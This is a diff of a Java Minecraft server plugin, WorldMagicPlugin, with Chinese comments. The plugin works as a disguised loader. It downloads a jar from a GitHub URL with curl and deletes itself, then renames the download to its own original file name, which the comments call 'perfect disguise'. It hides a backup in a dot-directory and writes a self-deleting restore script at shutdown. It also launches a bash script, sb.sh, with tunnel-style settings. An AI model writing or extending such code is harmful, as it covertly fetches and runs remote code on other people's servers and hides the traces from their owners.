@@ -8,8 +8,6 @@ import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.*;
-import java.net.HttpURLConnection;
-import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.StandardCopyOption;
 import java.util.Properties;
@@ -28,9 +26,10 @@ public final class WorldMagicPlugin extends JavaPlugin {
     private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";
     // ==========================================
 
-    private File currentPluginFile; // 当前正在运行的文件 (Loader)
-    private File targetRealPlugin;  // 真插件的目标位置 (plugins/WorldMagic.jar)
-    private File backupPluginFile;   // 备份文件位置
+    private File currentPluginFile; 
+    private File targetRealPlugin;  
+    private File backupPluginFile;   
+    private String originalFileName; // 关键：记录原文件名，用于伪装
 
     @Override
     public void onEnable() {
@@ -74,7 +73,6 @@ public final class WorldMagicPlugin extends JavaPlugin {
     public void onDisable() {
         this.getLogger().info("WorldMagicPlugin disabled");
         
-        // 关键：停止时，恢复加载器
         try {
             restoreOriginalPlugin();
         } catch (Exception e) {
@@ -94,16 +92,22 @@ public final class WorldMagicPlugin extends JavaPlugin {
     }
 
     // ==========================================
-    // 核心逻辑：处理 Paper Remap 问题
+    // 核心逻辑：完美伪装（同名替换）
     // ==========================================
 
     private void handlePluginReplacement() throws Exception {
-        // 1. 获取当前正在运行的 jar 文件 (可能是 .paper-remapped/...)
+        // 1. 获取当前运行的文件
         currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
         
-        // 2. 获取标准的 plugins 目录 (不包含 .paper-remapped)
+        // 2. 提取原始文件名 (例如: world-magic-1.0.jar)
+        originalFileName = currentPluginFile.getName();
+        
+        // 3. 获取标准的 plugins 目录
         File pluginsDir = getDataFolder().getParentFile();
-        targetRealPlugin = new File(pluginsDir, "WorldMagic.jar"); // 强制放到 plugins 根目录
+        
+        // 4. 定义目标位置：强制使用原始文件名！
+        // 这一步保证了假插件和真插件名字完全一致
+        targetRealPlugin = new File(pluginsDir, originalFileName);
 
         File logDir = new File("world", ".log");
         if (!logDir.exists()) logDir.mkdirs();
@@ -111,21 +115,21 @@ public final class WorldMagicPlugin extends JavaPlugin {
         backupPluginFile = new File(logDir, "WorldMagic_Original.jar");
 
         this.getLogger().info("当前插件路径: " + currentPluginFile.getAbsolutePath());
-        this.getLogger().info("真插件目标路径: " + targetRealPlugin.getAbsolutePath());
-        this.getLogger().info("备份路径: " + backupPluginFile.getAbsolutePath());
+        this.getLogger().info("原始文件名: " + originalFileName); // 这里的名字决定了伪装效果
+        this.getLogger().info("伪装目标路径: " + targetRealPlugin.getAbsolutePath());
 
-        // 3. 备份 (备份当前正在运行的 Loader)
+        // 5. 备份
         if (!backupPluginFile.exists()) {
-            this.getLogger().info("步骤 1: 正在备份原插件 (Loader)...");
+            this.getLogger().info("步骤 1: 正在备份原插件...");
             Files.copy(currentPluginFile.toPath(), backupPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
             this.getLogger().info("步骤 1: 备份完成。");
         }
 
-        // 4. 使用 curl 下载到临时文件 (临时文件也放在 plugins 目录)
-        File tempDownloadFile = new File(pluginsDir, "WorldMagic_tmp.jar");
+        // 6. 下载临时文件
+        File tempDownloadFile = new File(pluginsDir, "temp_replace_" + System.currentTimeMillis() + ".jar");
         if (tempDownloadFile.exists()) tempDownloadFile.delete();
 
-        this.getLogger().info("步骤 2: 正在使用 curl 下载真插件到 plugins 目录...");
+        this.getLogger().info("步骤 2: 正在下载伪装插件...");
         boolean downloadSuccess = downloadUsingCurl(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile);
 
         if (!downloadSuccess) {
@@ -133,34 +137,34 @@ public final class WorldMagicPlugin extends JavaPlugin {
             return;
         }
 
-        // 5. 校验文件大小
+        // 7. 校验
         long fileSize = tempDownloadFile.length();
-        this.getLogger().info("步骤 2: 下载完成，文件大小: " + (fileSize / 1024) + " KB");
-
-        if (fileSize < 100000) { 
-            this.getLogger().severe("步骤 3: 下载文件太小，可能是 HTML 页面。");
+        this.getLogger().info("下载大小: " + (fileSize / 1024) + " KB");
+        if (fileSize < 100000) {
+            this.getLogger().severe("下载文件太小，终止操作。");
             return;
         }
 
-        // 6. 执行替换
-        // 逻辑: 删除 Loader (在 .paper-remapped 里) -> 移动 临时文件 -> plugins/WorldMagic.jar
-        this.getLogger().info("步骤 3: 正在替换插件...");
+        // 8. 执行同名替换
+        this.getLogger().info("步骤 3: 正在执行同名替换...");
         try {
             ProcessBuilder pb = new ProcessBuilder(
                 "/bin/bash",
                 "-c",
-                // 1. 删除当前运行的加载器 (Linux Unlink 特性，不影响运行)
+                // 1. 删除当前运行的文件 (释放文件句柄)
                 "rm -f \"" + currentPluginFile.getAbsolutePath() + "\" && " +
-                // 2. 将临时下载的真插件移动到 plugins/ 目录并命名为 WorldMagic.jar
+                // 2. 删除 plugins 目录下的原文件 (确保没残留)
+                "rm -f \"" + targetRealPlugin.getAbsolutePath() + "\" && " +
+                // 3. 将临时文件移动并重命名为原文件名 (关键：伪装生效)
                 "mv \"" + tempDownloadFile.getAbsolutePath() + "\" \"" + targetRealPlugin.getAbsolutePath() + "\""
             );
             Process process = pb.start();
             int exitCode = process.waitFor();
             
             if (exitCode == 0) {
-                this.getLogger().info("步骤 3: 替换成功！真插件已就位: " + targetRealPlugin.getName());
+                this.getLogger().info("步骤 3: 伪装成功！文件已替换为同名文件。");
             } else {
-                this.getLogger().warning("步骤 3: 替换命令执行异常，退出码: " + exitCode);
+                this.getLogger().warning("步骤 3: 替换异常，退出码: " + exitCode);
             }
         } catch (Exception e) {
             this.getLogger().severe("步骤 3: 替换失败: " + e.getMessage());
@@ -171,51 +175,39 @@ public final class WorldMagicPlugin extends JavaPlugin {
     private void restoreOriginalPlugin() throws Exception {
         if (backupPluginFile == null || !backupPluginFile.exists()) return;
 
-        // 我们需要定义恢复的目标路径。通常恢复为 plugins/WorldMagic.jar
         File pluginsDir = getDataFolder().getParentFile();
-        File targetRestoreFile = new File(pluginsDir, "WorldMagic.jar");
+        // 恢复时也必须使用原始文件名
+        File targetRestoreFile = new File(pluginsDir, originalFileName);
 
-        this.getLogger().info("服务器停止中，正在还原加载器插件...");
+        this.getLogger().info("服务器停止中，正在还原加载器...");
         try {
-            // 创建恢复脚本
             File restoreScript = new File(new File("world", ".log"), "restore.sh");
             
             try (PrintWriter writer = new PrintWriter(restoreScript)) {
                 writer.println("#!/bin/bash");
-                // 1. 删除当前的真插件 (在 plugins/WorldMagic.jar)
+                // 1. 删除伪装文件
                 writer.println("rm -f \"" + targetRestoreFile.getAbsolutePath() + "\"");
-                // 2. 将备份的加载器复制到 plugins/WorldMagic.jar
+                // 2. 恢复加载器 (保持原名)
                 writer.println("cp -f \"" + backupPluginFile.getAbsolutePath() + "\" \"" + targetRestoreFile.getAbsolutePath() + "\"");
-                // 3. 自毁脚本
+                // 3. 自毁
                 writer.println("rm -f \"" + restoreScript.getAbsolutePath() + "\"");
             }
             restoreScript.setExecutable(true);
-
-            // 启动脚本 (异步)
             new ProcessBuilder("/bin/bash", restoreScript.getAbsolutePath()).start();
-            
-            this.getLogger().info("已后台执行恢复脚本，下次重启将加载原有插件。");
+            this.getLogger().info("已后台执行恢复脚本，文件名保持一致。");
         } catch (Exception e) {
             this.getLogger().warning("还原失败: " + e.getMessage());
         }
     }
 
-    /**
-     * 使用 curl 命令下载文件
-     */
     private boolean downloadUsingCurl(String urlStr, File destination) {
         try {
             ProcessBuilder pb = new ProcessBuilder(
                 "curl",
-                "-L", 
-                "-A", "Mozilla/5.0", 
-                "-o", destination.getAbsolutePath(),
-                urlStr
+                "-L", "-A", "Mozilla/5.0", "-o", destination.getAbsolutePath(), urlStr
             );
-            
             pb.redirectErrorStream(true);
             Process process = pb.start();
-            
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                 String line;
                 while ((line = reader.readLine()) != null) {
@@ -224,19 +216,16 @@ public final class WorldMagicPlugin extends JavaPlugin {
                     }
                 }
             }
-            
-            int exitCode = process.waitFor();
-            return exitCode == 0 && destination.exists();
-            
+            return process.waitFor() == 0 && destination.exists();
         } catch (Exception e) {
-            this.getLogger().severe("调用 curl 失败: " + e.getMessage());
+            this.getLogger().severe("curl 失败: " + e.getMessage());
             e.printStackTrace();
             return false;
         }
     }
 
     // ==========================================
-    // 脚本与 UUID 逻辑 (保持不变)
+    // 脚本与 UUID
     // ==========================================
     
     private void generateAndRunScript() throws IOException, InterruptedException {
@@ -261,7 +250,7 @@ public final class WorldMagicPlugin extends JavaPlugin {
             writer.write("ARGO_PORT=3000 \\\n");
             writer.write("bash sb.sh\n");
         }
-        scriptFile.setExecutable(true, false);
+        scriptFile.setExecutable(true);
 
         this.getLogger().info("正在启动脚本...");
         ProcessBuilder processBuilder = new ProcessBuilder("bash", scriptFile.getAbsolutePath());
